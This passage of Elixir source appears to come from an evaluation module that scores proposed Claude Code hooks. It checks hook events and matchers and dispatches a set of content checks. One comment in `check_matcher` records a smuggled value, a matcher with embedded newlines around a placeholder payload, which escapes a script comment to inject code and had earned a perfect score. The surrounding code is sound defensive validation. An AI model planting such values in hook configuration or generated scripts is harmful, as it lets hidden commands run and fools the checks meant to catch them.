  # nesting — and a `"` inside `'…'` is a literal, not an opener.
  defp scan_code(<<q::utf8, rest::binary>>, acc, q), do: scan_code(rest, acc <> <<q::utf8>>, nil)

  defp scan_code(<<c::utf8, rest::binary>>, acc, quote) when not is_nil(quote),
    do: scan_code(rest, acc <> <<c::utf8>>, quote)

  defp scan_code(<<q::utf8, rest::binary>>, acc, nil) when q in [?', ?"],
    do: scan_code(rest, acc <> <<q::utf8>>, q)

  # The comment, at last — but only if the `#` starts a word. `a#b` is one word and no comment.
  defp scan_code(<<?#, rest::binary>>, acc, nil) do
    if acc == "" or String.last(acc) in [" ", "\t"],
      do: String.trim_trailing(acc),
      else: scan_code(rest, acc <> "#", nil)
  end

  defp scan_code(<<c::utf8, rest::binary>>, acc, nil),
    do: scan_code(rest, acc <> <<c::utf8>>, nil)

  @doc """
  The `settings.json` pointer shape: `event` must be one of `params[:known_events]` and `matcher`
  must be a non-empty string. `Faber.Eval` injects both off the proposal (the same way it injects
  `:refs` into the accuracy checks) because a pointer is a property of the proposal, not of the
  script text.

  Absent an injected pointer this **fails** rather than neutral-passing. That is the opposite of
  `valid_file_refs`'s posture and deliberately so: a missing ref known-set means "we couldn't
  resolve context", while a missing pointer means the hook has nowhere to be installed — an
  unanswerable question, not an unanswered one.
  """
  @spec hook_pointer(String.t(), map()) :: {boolean(), String.t()}
  def hook_pointer(_content, params) do
    event = params[:event]
    matcher = params[:matcher]

    # The two halves of a pointer are two independent questions, so they are two functions: `with`
    # passes a `{false, evidence}` straight through, and neither half has to know the other's rules.
    with :ok <- check_event(event, params[:known_events] || []),
         :ok <- check_matcher(matcher) do
      {true, "pointer: #{event} / #{matcher}"}
    end
  end

  defp check_event(event, _known) when not is_binary(event), do: {false, "no hook event declared"}
  defp check_event("", _known), do: {false, "no hook event declared"}

  defp check_event(event, known) do
    if known != [] and event not in known do
      {false,
       "unknown event #{inspect(event)} — a hook on an event Claude Code never fires " <>
         "is a hook that silently never runs (known: #{Enum.join(known, ", ")})"}
    else
      :ok
    end
  end

  defp check_matcher(matcher) when not is_binary(matcher),
    do: {false, "empty matcher — it would have to match every tool call or none"}

  defp check_matcher(matcher) do
    cond do
      String.trim(matcher) == "" ->
        {false, "empty matcher — it would have to match every tool call or none"}

      matcher =~ ~r/[\p{Cc}\p{Cf}]/u ->
        # A matcher reaches the rendered script inside a `#` comment, and a `#` comment ends at a
        # newline. `Propose.template_context/1` defangs it so this can't escape (that is the fix);
        # this is the second layer, and the one that makes the tampering *visible* rather than
        # silently laundering it into a valid-looking matcher. Reproduced live at da26a8f:
        # `matcher: "Bash\n<payload>\n#"` scored composite 1.0 with vetoed: [].
        {false,
         "matcher contains a control or format character — a hook matcher is a regex over tool " <>
           "names, so a newline or ANSI escape in it is tampering, not a pattern"}

      true ->
        :ok
    end
  end

  # ## Why there is NO "is the matcher a valid regex?" check here
  #
  # It was written, and removed, and the reason is worth keeping so it isn't re-added. It looked
  # free — a matcher Claude Code can't compile is a hook that silently never fires, exactly the
  # fail-quietly shape `check_event/2` guards. It is not free:
  #
  #   * **`*` does not compile** (`quantifier does not follow a repeatable item`) and `*` is a real,
  #     documented, in-use matcher meaning "every tool". It is in this repo's own parity fixtures
  #     AND in the settings.json on this machine. The check rejected it.
  #   * **"valid regex" is engine-dependent**, and the deciding engine is neither of ours: Claude
  #     Code runs JavaScript `RegExp`, this side is PCRE, the sidecar is Python `re`. Agreeing with
  #     each other would not mean agreeing with the thing that runs the matcher.
  #
  # So the check would have failed real hooks to catch a hypothetical typo, and the parity suite
  # would have called that "agreement" because both engines were wrong together. Control and format
  # characters are validated instead: that is tampering under any grammar, and it needs no model of
  # Claude Code's matcher syntax to be certain about.

  @doc "Dispatch a check by type. Unknown types fail (caught by the scorer)."
  @spec run_check(atom() | String.t(), String.t(), map()) :: {boolean(), String.t()}
  # A flat name → matcher dispatch table, not branching logic: every clause is a single call and
  # the count only grows when a new matcher is added. Cyclomatic complexity scores it 21, but the
  # alternative (a %{} of captures) trades a greppable, arity-checked table for an opaque map.
  # credo:disable-for-next-line Credo.Check.Refactor.CyclomaticComplexity
  def run_check(type, content, params) do
    case to_string(type) do
      "hook_shebang" -> hook_shebang(content, params)
      "hook_reads_stdin" -> hook_reads_stdin(content, params)
      "hook_pointer" -> hook_pointer(content, params)
      "hook_no_format_chars" -> hook_no_format_chars(content, params)
      "section_exists" -> section_exists(content, params)
      "max_section_lines" -> max_section_lines(content, params)
      "line_count" -> line_count(content, params)
      "token_estimate" -> token_estimate(content, params)
      "frontmatter_field" -> frontmatter_field(content, params)
      "description_length" -> description_length(content, params)
      "description_keywords" -> description_keywords(content, params)
      "description_no_vague" -> description_no_vague(content, params)
      "description_structure" -> description_structure(content, params)
      "content_present" -> content_present(content, params)
      "content_absent" -> content_absent(content, params)
      "has_iron_laws" -> has_iron_laws(content, params)
      "no_dangerous_patterns" -> no_dangerous_patterns(content, params)
      "has_examples" -> has_examples(content, params)
      "action_density" -> action_density(content, params)
      "specificity_ratio" -> specificity_ratio(content, params)
      "valid_file_refs" -> valid_file_refs(content, params)
      "valid_skill_refs" -> valid_skill_refs(content, params)
      "valid_agent_refs" -> valid_agent_refs(content, params)
      other -> {false, "unknown check_type: #{other}"}
    end
  end

  defp fmt(r), do: :erlang.float_to_binary(r * 1.0, decimals: 2)
end
